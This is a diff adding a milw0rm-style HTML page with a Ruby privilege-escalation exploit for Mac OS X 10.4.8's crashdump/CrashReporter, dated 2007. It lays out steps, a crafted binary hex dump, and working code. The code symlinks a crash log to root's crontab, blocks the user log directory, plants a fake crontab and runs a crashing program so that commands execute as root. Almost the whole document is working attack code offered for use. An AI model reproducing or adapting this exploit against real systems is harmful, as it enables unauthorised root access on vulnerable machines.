@@ -1,0 +1,44 @@
+<html><head><title>Mac OS X 10.4.8 (8L2127) crashdump Privilege Escalation Exploit</title></head><pre>#!/usr/bin/ruby
+# Copyright (c) 2007 Kevin Finisterre &lt;kf_lists [at] digitalmunition.com&gt;
+#                    Lance M. Havok   &lt;lmh [at] info-pull.com&gt;
+# All pwnage reserved.
+#
+# 1) Stop crashdump from writing to ~/Library/Logs via chmod 000 ~/Library/Logs/CrashReporter
+# 2) Make symlink to /Library/Logs/CrashReporter/knownprog.crash.log
+# 3) Create a program with a modified __LINKEDIT segment that influences crashreporter output 
+#
+# 0000320: 3800 0000 5f5f 4c49 4e4b 4544 4954 0000  8...__LINKEDIT..
+# 0000330: 0000 0000 0040 0000 0010 0000 0030 0000  .....@.......0..
+# 0000340: 2004 0000 0300 0000 0100 0000 0000 0000   ...............
+# 0000350: 0400 0000 0e00 0000 1c00 0000 0c00 0000  ................
+# 0000360: 2f75 7372 2f6c 6962 2f64 796c 6400 0000  /usr/lib/dyld...
+# 0000370: 0c00 0000 3400 0000 1800 0000 68b7 9b45  ....4.......h..E
+# 0000380: 0403 5800 0000 0100 0d0a 2a20 2a20 2a20  ..X.......* * * 
+# 0000390: 2a20 2a20 2f74 6d70 2f78 0d0a 2e64 796c  * * /tmp/x...dyl
+# 00003a0: 6962 0000 0200 0000 1800 0000 0030 0000  ib...........0..
+#
+# 4) Run the fake program which will crash and create /var/cron/tabs/root
+# 5) Sleep and then create a legit crontab to refresh cron
+ 
+SYMLINK_PATH  = &quot;/Library/Logs/CrashReporter/vuln.crash.log&quot;
+
+PWNERCYCLE    = &quot;ln -s /var/cron/tabs/root #{SYMLINK_PATH};&quot;    +
+                &quot;chmod 000 ~/Library/Logs/CrashReporter/;&quot;      +
+                &quot;crontab /tmp/fakecron;&quot;                        +
+                &quot;chmod +x /Users/Shared/r00t; sleep 61; ./vuln;&quot;
+
+def escalate()
+  puts &quot;++ Fixing up a fake crontab&quot;
+  fakecron = File.new(&quot;/tmp/fakecron&quot;, &quot;w&quot;)
+  fakecron.print(&quot;* * * * * /usr/bin/id &gt; /tmp/USERCRON\n&quot;)
+  fakecron.close
+  tmp_ex = File.new(&quot;/Users/Shared/r00t&quot;, &quot;w&quot;)
+  tmp_ex.print(&quot;/usr/bin/id &gt; /tmp/CRASHREPOWNED\n&quot;)
+  tmp_ex.close
+
+  system PWNERCYCLE
+end
+
+escalate()
+
+# milw0rm.com [2007-01-29]</pre></html>
